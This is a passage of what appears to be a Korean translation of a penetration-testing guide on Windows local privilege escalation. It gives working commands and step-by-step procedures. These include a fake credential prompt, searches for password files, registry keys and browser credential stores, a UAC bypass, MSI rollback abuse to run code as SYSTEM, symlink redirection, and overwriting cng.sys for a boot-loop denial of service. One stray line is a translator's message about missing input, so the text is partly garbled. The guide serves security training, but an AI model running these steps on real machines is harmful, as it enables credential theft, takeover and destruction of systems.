$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **자격 증명을 포함할 수 있는 가능한 파일명**

예전에 **clear-text** 또는 **Base64** 형태의 **passwords**를 포함하고 있던 것으로 알려진 파일들
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
원하시는 파일 목록이 제공되지 않았습니다. 번역할 `src/windows-hardening/windows-local-privilege-escalation/README.md`의 전체 내용을 보내주시면, 마크다운/HTML 구문은 그대로 유지한 채 한국어로 번역해드리겠습니다.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin 안의 Credentials

거기 안에서 credentials를 찾기 위해 Bin도 확인해야 합니다

여러 프로그램에 저장된 **passwords**를 recover하려면 다음을 사용할 수 있습니다: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### registry 내부

**credentials가 있는 다른 가능한 registry keys**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**registry에서 openssh 키 추출.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 브라우저 기록

**Chrome** 또는 **Firefox**에서 비밀번호가 저장된 db를 확인해야 합니다.\
또한 브라우저의 기록, 북마크, 즐겨찾기도 확인해서 거기에 **passwords are** 저장되어 있을 수 있는지 보세요.

브라우저에서 비밀번호를 추출하는 도구:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**은 Windows 운영 체제에 내장된 기술로, 서로 다른 언어의 소프트웨어 구성 요소 간 **intercommunication**을 가능하게 합니다. 각 COM 구성 요소는 **class ID (CLSID)**로 식별되며, 각 구성 요소는 하나 이상의 interface를 통해 기능을 노출하고, 이 interface는 interface IDs (IIDs)로 식별됩니다.

COM class와 interface는 각각 레지스트리의 **HKEY\CLASSES\ROOT\CLSID** 및 **HKEY\CLASSES\ROOT\Interface** 아래에 정의됩니다. 이 레지스트리는 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.** 를 병합하여 생성됩니다.

이 레지스트리의 CLSID 안에서는 자식 레지스트리 **InProcServer32**를 찾을 수 있으며, 여기에는 **DLL**을 가리키는 **default value**와 **ThreadingModel**이라는 값이 있습니다. 이 값은 **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi), 또는 **Neutral** (Thread Neutral)일 수 있습니다.

![](<../../images/image (729).png>)

기본적으로, 실행될 **DLLs** 중 하나라도 **overwrite**할 수 있다면, 그 DLL이 다른 사용자에 의해 실행될 경우 **privileges**를 **escalate**할 수 있습니다.

공격자가 지속성 메커니즘으로 COM Hijacking을 어떻게 사용하는지 알아보려면 다음을 확인하세요:


{{#ref}}
com-hijacking.md
{{endref}}

### **파일 및 레지스트리에서 Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**특정 파일 이름으로 파일 찾기**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**레지스트리에서 키 이름과 비밀번호 검색**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 비밀번호를 찾는 도구들

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **은 msf** 플러그인으로, 내가 만든 이 플러그인은 **victim 내부에서 credentials를 찾는 모든 metasploit POST 모듈을 자동으로 실행**합니다.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 는 이 페이지에서 언급된 password를 포함하는 모든 파일을 자동으로 찾습니다.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 는 system에서 password를 추출하는 또 다른 훌륭한 도구입니다.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 도구는 평문으로 이 데이터를 저장하는 여러 도구의 **sessions**, **usernames** 및 **passwords**를 찾습니다 (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**SYSTEM으로 실행 중인 프로세스가 새 프로세스를 열고**(`OpenProcess()`) **full access**를 가진다고 상상해 보세요. 같은 프로세스가 **또한 새 프로세스를 생성하고**(`CreateProcess()`) **low privileges**로 실행되지만, 메인 프로세스의 모든 open handles를 상속합니다.\
그런 다음, **low privileged 프로세스에 대해 full access**를 가지고 있다면, `OpenProcess()`로 생성된 **privileged 프로세스에 대한 open handle**을 가져와 **shellcode를 주입**할 수 있습니다.\
[이 취약점을 **어떻게 탐지하고 악용하는지**에 대한 더 많은 정보는 이 예제를 읽어보세요.](leaked-handle-exploitation.md)\
[**다른 이 글**은 서로 다른 권한 수준에서 상속된 프로세스와 thread의 더 많은 open handlers를 테스트하고 abuse하는 방법에 대한 더 완전한 설명을 제공합니다(단순히 full access만이 아님).](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**pipes**라고 불리는 shared memory segments는 프로세스 간 통신과 데이터 전송을 가능하게 합니다.

Windows는 **Named Pipes**라는 기능을 제공하여, 서로 관련 없는 프로세스들도 서로 다른 네트워크를 넘어 데이터를 공유할 수 있게 합니다. 이는 **named pipe server**와 **named pipe client**라는 역할이 정의된 client/server architecture와 유사합니다.

**client**가 pipe를 통해 데이터를 보내면, pipe를 설정한 **server**는 필요한 **SeImpersonate** 권한이 있다면 **client의 identity를 가장**할 수 있습니다. pipe를 통해 통신하는 **privileged process**를 식별해 이를 흉내 낼 수 있다면, 직접 설정한 pipe와 상호작용하는 순간 그 프로세스의 identity를 취함으로써 **더 높은 권한을 얻을 기회**가 생깁니다. 이러한 공격을 수행하는 방법은 [**여기**](named-pipe-client-impersonation.md)와 [**여기**](#from-high-integrity-to-system)에서 유용한 가이드를 찾을 수 있습니다.

또한 다음 도구를 사용하면 **burp 같은 도구로 named pipe communication을 intercept**할 수 있습니다: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **그리고 이 도구는 privescs를 찾기 위해 모든 pipes를 나열하고 볼 수 있게 해줍니다** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

서버 모드의 Telephony 서비스(TapiSrv)는 `\\pipe\\tapsrv`(MS-TRP)를 노출합니다. 원격 인증된 client는 mailslot 기반 async event 경로를 악용하여 `ClientAttach`를 `NETWORK SERVICE`가 쓸 수 있는 기존 파일에 대한 임의의 **4-byte write**로 바꿀 수 있고, 그런 다음 Telephony admin 권한을 얻어 서비스로 임의의 DLL을 로드할 수 있습니다. 전체 흐름:

- `pszDomainUser`를 쓸 수 있는 기존 경로로 설정한 `ClientAttach` → 서비스가 이를 `CreateFileW(..., OPEN_EXISTING)`로 열고 async event write에 사용합니다.
- 각 event는 `Initialize`의 attacker-controlled `InitContext`를 그 handle에 씁니다. `LRegisterRequestRecipient`(`Req_Func 61`)으로 line app을 등록하고, `TRequestMakeCall`(`Req_Func 121`)을 트리거한 뒤, `GetAsyncEvents`(`Req_Func 0`)로 가져오고, 그다음 unregister/shutdown하여 결정론적인 write를 반복합니다.
- `C:\Windows\TAPI\tsec.ini`의 `[TapiAdministrators]`에 자신을 추가한 뒤 reconnect하고, `GetUIDllName`을 임의의 DLL path로 호출하여 `TSPI_providerUIIdentify`를 `NETWORK SERVICE`로 실행합니다.

더 자세한 내용:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

페이지 **[https://filesec.io/](https://filesec.io/)**를 확인해 보세요

### Protocol handler / ShellExecute abuse via Markdown renderers

`ShellExecuteExW`로 전달되는 클릭 가능한 Markdown links는 위험한 URI handlers(`file:`, `ms-appinstaller:` 또는 등록된 scheme)를 트리거하고 현재 사용자로 attacker-controlled files를 실행할 수 있습니다. 다음을 참고하세요:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

사용자로 shell을 얻었을 때, command line에 **credentials를 전달하는** scheduled tasks나 다른 process들이 실행 중일 수 있습니다. 아래 script는 2초마다 process command lines를 캡처하고 현재 상태를 이전 상태와 비교하여 차이점을 출력합니다.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 프로세스에서 비밀번호 탈취

## Low Priv User에서 NT\AUTHORITY SYSTEM으로 (CVE-2019-1388) / UAC Bypass

그래픽 인터페이스에 접근할 수 있고(콘솔 또는 RDP 통해), UAC가 활성화되어 있다면, 일부 Microsoft Windows 버전에서는 권한이 없는 사용자로부터 터미널이나 "NT\AUTHORITY SYSTEM" 같은 다른 프로세스를 실행할 수 있습니다.

이로 인해 동일한 vulnerability를 이용해 privileges를 상승시키고 동시에 UAC를 bypass할 수 있습니다. 또한 별도로 아무것도 설치할 필요가 없고, 이 과정에서 사용되는 binary는 Microsoft가 서명하고 발급한 것입니다.

영향을 받는 시스템 중 일부는 다음과 같습니다:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
이 취약점을 exploit하려면 다음 단계를 수행해야 합니다:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## From Administrator Medium to High Integrity Level / UAC Bypass

Integrity Levels에 대해 **알아보려면 읽어보세요**:


{{#ref}}
integrity-levels.md
{{#endref}}

그다음 **UAC와 UAC bypass에 대해 알아보려면 이것을 읽어보세요:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

이 technique는 [**이 blog post에서**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) 설명되며, exploit code는 [**여기에서**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) 사용할 수 있습니다.

이 attack은 기본적으로 Windows Installer의 rollback feature를 악용해서 uninstall 과정 중에 정상 파일을 malicious 파일로 바꾸는 방식으로 동작합니다. 이를 위해 attacker는 **malicious MSI installer**를 만들어 `C:\Config.Msi` folder를 hijack해야 하며, 이후 Windows Installer가 다른 MSI package의 uninstall 중 rollback files를 저장할 때 이 folder를 사용하게 됩니다. 그때 rollback files가 수정되어 malicious payload를 담게 됩니다.

요약된 technique는 다음과 같습니다:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- harmless file(`dummy.txt`)을 writable folder(`TARGETDIR`)에 설치하는 `.msi`를 만듭니다.
- non-admin user가 실행할 수 있도록 installer를 **"UAC Compliant"**로 표시합니다.
- 설치 후 file에 대한 **handle**을 계속 열어 둡니다.

- Step 2: Begin Uninstall
- 같은 `.msi`를 uninstall합니다.
- uninstall process가 files를 `C:\Config.Msi`로 옮기고 `.rbf` files(rollback backups)로 이름을 바꾸기 시작합니다.
- `GetFinalPathNameByHandle`을 사용해 열린 file handle을 **poll**하여 file이 `C:\Config.Msi\<random>.rbf`가 되는 시점을 감지합니다.

- Step 3: Custom Syncing
- `.msi`에는 **custom uninstall action (`SyncOnRbfWritten`)**이 포함되어 있으며:
- `.rbf`가 written되면 신호를 보냅니다.
- 그런 다음 uninstall을 계속하기 전에 다른 event를 **wait**합니다.

- Step 4: Block Deletion of `.rbf`
- 신호를 받으면 `.rbf` file을 `FILE_SHARE_DELETE` 없이 **open**합니다 — 이렇게 하면 **삭제되지 못하게 막습니다**.
- 그런 다음 uninstall을 계속할 수 있도록 다시 **signal**합니다.
- Windows Installer가 `.rbf`를 삭제하지 못하고, 모든 contents를 지우지 못하므로 **`C:\Config.Msi`가 제거되지 않습니다**.

- Step 5: Manually Delete `.rbf`
- attacker인 당신이 `.rbf` file을 수동으로 삭제합니다.
- 이제 **`C:\Config.Msi`는 비어 있고**, hijack 준비가 완료됩니다.

> 이 시점에서 **SYSTEM-level arbitrary folder delete vulnerability**를 trigger하여 `C:\Config.Msi`를 삭제합니다.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- `C:\Config.Msi` folder를 직접 다시 만듭니다.
- **weak DACLs**(예: Everyone:F)를 설정하고, `WRITE_DAC`이 있는 상태로 **handle**을 계속 열어 둡니다.

- Step 7: Run Another Install
- 다음 옵션으로 `.msi`를 다시 설치합니다:
- `TARGETDIR`: Writable location.
- `ERROROUT`: forced failure를 유발하는 variable.
- 이 install은 rollback을 다시 trigger하는 데 사용되며, `.rbs`와 `.rbf`를 읽게 됩니다.

- Step 8: Monitor for `.rbs`
- `ReadDirectoryChangesW`를 사용해 `C:\Config.Msi`를 모니터링하다가 새로운 `.rbs`가 나타날 때까지 기다립니다.
- 그 filename을 캡처합니다.

- Step 9: Sync Before Rollback
- `.msi`에는 **custom install action (`SyncBeforeRollback`)**이 포함되어 있으며:
- `.rbs`가 생성되면 event를 signal합니다.
- 그리고 계속하기 전에 **wait**합니다.

- Step 10: Reapply Weak ACL
- `.rbs created` event를 받은 뒤:
- Windows Installer가 `C:\Config.Msi`에 **strong ACLs**를 다시 적용합니다.
- 하지만 `WRITE_DAC`이 있는 handle을 아직 가지고 있으므로, **weak ACLs를 다시 적용**할 수 있습니다.

> ACLs는 **handle open 시점에만 enforced**되므로, 여전히 folder에 쓸 수 있습니다.

- Step 11: Drop Fake `.rbs` and `.rbf`
- `.rbs` file을 Windows에게 다음을 수행하도록 지시하는 **fake rollback script**로 덮어씁니다:
- 당신의 `.rbf` file(malicious DLL)을 **privileged location**(예: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`)으로 복원합니다.
- malicious SYSTEM-level payload DLL이 들어 있는 fake `.rbf`를 drop합니다.

- Step 12: Trigger the Rollback
- sync event를 signal하여 installer가 다시 진행되게 합니다.
- **type 19 custom action (`ErrorOut`)**가 install을 의도적으로 실패시키도록 알려진 지점에서 설정되어 있습니다.
- 이로 인해 **rollback이 시작**됩니다.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer는:
- malicious `.rbs`를 읽습니다.
- 당신의 `.rbf` DLL을 target location으로 복사합니다.
- 이제 **SYSTEM-loaded path**에 malicious DLL이 있게 됩니다.

- Final Step: Execute SYSTEM Code
- hijack한 DLL을 로드하는 trusted **auto-elevated binary**(예: `osk.exe`)를 실행합니다.
- **Boom**: 당신의 code가 **SYSTEM으로 실행**됩니다.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

main MSI rollback technique(위의 것)는 `C:\Config.Msi` 같은 **entire folder**를 삭제할 수 있다고 가정합니다. 하지만 vulnerability가 **arbitrary file deletion**만 허용한다면 어떨까요?

**NTFS internals**를 악용할 수 있습니다: 모든 folder에는 `:`
```
C:\SomeFolder::$INDEX_ALLOCATION
```
이 스트림은 폴더의 **index metadata**를 저장합니다.

따라서 폴더의 **`::$INDEX_ALLOCATION` 스트림을 삭제**하면, NTFS는 파일시스템에서 **폴더 전체를 제거**합니다.

다음과 같은 표준 파일 삭제 APIs를 사용해 이를 수행할 수 있습니다:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> 파일 delete API를 호출하고 있지만, 실제로는 **폴더 자체를 삭제**합니다.

### Folder Contents Delete에서 SYSTEM EoP로
당신의 primitive가 임의의 파일/폴더를 삭제할 수는 없지만, **공격자가 제어하는 폴더의 *contents*를 삭제할 수는 있다면**?

1. Step 1: bait folder와 file 설정
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt`에 **oplock** 설정
- privileged process가 `file1.txt`를 삭제하려고 할 때 oplock이 **execution을 중단**시킵니다.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM 프로세스 트리거 (예: `SilentCleanup`)
- 이 프로세스는 폴더들(예: `%TEMP%`)을 스캔하고 그 내용물을 삭제하려고 시도합니다.
- `file1.txt`에 도달하면, **oplock가 트리거**되고 제어가 당신의 callback으로 넘어갑니다.

4. Step 4: oplock callback 내부에서 – deletion 리다이렉트

- Option A: `file1.txt`를 다른 곳으로 이동
- 이렇게 하면 oplock를 깨지 않고 `folder1`이 비워집니다.
- `file1.txt`를 직접 delete하지 마세요 — 그러면 oplock가 너무 일찍 해제됩니다.

- Option B: `folder1`을 **junction**으로 변환:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: `\RPC Control`에 **symlink**를 생성합니다:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> This targets the NTFS internal stream that stores folder metadata — deleting it deletes the folder.

5. Step 5: Release the oplock
- SYSTEM process continues and tries to delete `file1.txt`.
- But now, due to the junction + symlink, it's actually deleting:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**결과**: `C:\Config.Msi`는 SYSTEM에 의해 삭제됩니다.

### Arbitrary Folder Create에서 Permanent DoS로

**SYSTEM/admin으로 임의의 폴더를 생성**할 수 있게 해주는 primitive를 악용합니다 — **파일을 쓸 수 없거나** **약한 권한을 설정할 수 없어도** 가능합니다.

**파일**이 아니라 **폴더**를 **중요한 Windows driver** 이름으로 생성합니다. 예:
```
C:\Windows\System32\cng.sys
```
- 이 경로는 보통 `cng.sys` 커널 모드 드라이버에 해당합니다.
- 이것을 **미리 폴더로 생성**하면, Windows는 부팅 시 실제 드라이버를 로드하지 못합니다.
- 그러면 Windows는 부팅 중 `cng.sys`를 로드하려고 시도합니다.
- 폴더를 발견하고, **실제 드라이버를 해석하지 못해**, **크래시하거나 부팅을 중단**합니다.
- **대체 수단이 없고**, 외부 개입(예: 부팅 복구 또는 디스크 접근) 없이는 **복구할 수 없습니다**.

### privileged log/backup paths + OM symlinks에서 arbitrary file overwrite / boot DoS까지

**privileged service**가 **writable config**에서 읽은 경로로 로그/내보내기 파일을 쓸 때, **Object Manager symlinks + NTFS mount points**로 그 경로를 리다이렉트하면 privileged write를 arbitrary overwrite로 바꿀 수 있습니다(**SeCreateSymbolicLinkPrivilege** 없이도 가능).

**요구사항**
- 대상 경로를 저장하는 config가 공격자에게 writable 해야 함(예: `%ProgramData%\...\.ini`).
- `\RPC Control`에 mount point와 OM file symlink를 만들 수 있어야 함(James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- 해당 경로에 쓰는 privileged operation이 있어야 함(log, export, report).

**예시 체인**
1. config를 읽어 privileged log destination을 복구합니다. 예: `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. admin 없이 경로를 리다이렉트합니다:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 특권 구성 요소가 로그를 쓰기를 기다립니다(예: admin이 "send test SMS"를 트리거). 이제 쓰기는 `C:\Windows\System32\cng.sys`에 기록됩니다.
4. 덮어쓴 대상(hex/PE parser)을 검사해 corruption을 확인합니다. reboot하면 Windows가 변조된 driver path를 로드하게 되어 → **boot loop DoS**가 발생합니다. 이는 권한 있는 서비스가 write로 열게 되는 모든 protected file에도 일반화됩니다.

> `cng.sys`는 보통 `C:\Windows\System32\drivers\cng.sys`에서 로드되지만, `C:\Windows\System32\cng.sys`에 copy가 있으면 먼저 시도될 수 있어, 손상된 data를 위한 신뢰할 수 있는 DoS sink가 됩니다.



## **From High Integrity to System**

### **New service**

이미 High Integrity process에서 실행 중이라면, **SYSTEM으로 가는 path**는 새 service를 **만들고 실행하는 것만으로도** 쉬울 수 있습니다:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> service binary를 만들 때는 유효한 service이거나, 그렇지 않다면 binary가 필요한 작업을 충분히 빠르게 수행하도록 해야 합니다. 유효한 service가 아니면 20s 안에 종료됩니다.

### AlwaysInstallElevated

High Integrity process에서 **AlwaysInstallElevated registry entries를 enable**하고 _**.msi**_ wrapper를 사용해 reverse shell을 **install**해볼 수 있습니다.\
[관련된 registry keys와 _.msi_ package를 설치하는 방법에 대한 더 많은 정보는 여기 있습니다.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**코드는 여기에서** [**찾을 수 있습니다**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

이 token privileges가 있다면(아마 이미 High Integrity process에서 찾게 될 것입니다), SeDebug privilege로 **거의 모든 process**(protected processes는 제외)를 **open**할 수 있고, process의 **token을 copy**한 뒤, 그 token으로 **arbitrary process**를 만들 수 있습니다.\
이 technique에서는 보통 **SYSTEM으로 실행 중인 process 중 모든 token privileges를 가진 아무 process나 선택**합니다. (_예, 모든 token privileges를 갖지 않은 SYSTEM process도 찾을 수 있습니다_)\
**이 technique을 실행하는 code 예시는** [**여기에서 찾을 수 있습니다**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

이 technique은 meterpreter가 `getsystem`에서 privilege escalation을 할 때 사용합니다. 이 technique은 **pipe를 만들고, 그 pipe에 쓰도록 service를 만들거나 악용하는 것**으로 구성됩니다. 그런 다음 **`SeImpersonate`** privilege를 사용해 pipe를 만든 **server**는 pipe client(즉 service)의 **token을 impersonate**할 수 있게 되어 SYSTEM privileges를 획득합니다.\
[**name pipes에 대해 더 알아보려면 이 글을 읽으세요**](#named-pipe-client-impersonation).\
[**name pipes를 사용해 high integrity에서 System으로 가는 예시를 보려면 이 글을 읽으세요**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM**으로 실행되는 **process**가 **load**하는 **dll을 hijack**할 수 있다면, 해당 권한으로 arbitrary code를 실행할 수 있습니다. 따라서 Dll Hijacking은 이런 종류의 privilege escalation에도 유용하며, 게다가 **high integrity process에서 훨씬 더 쉽게 달성**할 수 있습니다. 왜냐하면 dll을 load하는 데 사용되는 폴더들에 대해 **write permissions**를 가지고 있기 때문입니다.\
**Dll hijacking에 대해 더 알아보려면 여기에서** [**확인할 수 있습니다**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors를 찾는 최고의 tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations와 sensitive files를 확인합니다 (**[**여기에서 확인**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 가능한 misconfigurations를 확인하고 정보를 수집합니다 (**[**여기에서 확인**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations를 확인합니다**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla, RDP 저장된 session 정보를 추출합니다. local에서는 -Thorough를 사용하세요.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager에서 crendentials를 추출합니다. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 수집한 password를 domain 전체에 spray합니다**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh는 PowerShell ADIDNS/LLMNR/mDNS spoofer이자 man-in-the-middle tool입니다.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 기본 privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 알려진 privesc vulnerabilities를 찾습니다 (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 알려진 privesc vulnerabilities를 찾습니다 (VisualStudio로 compile해야 함) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
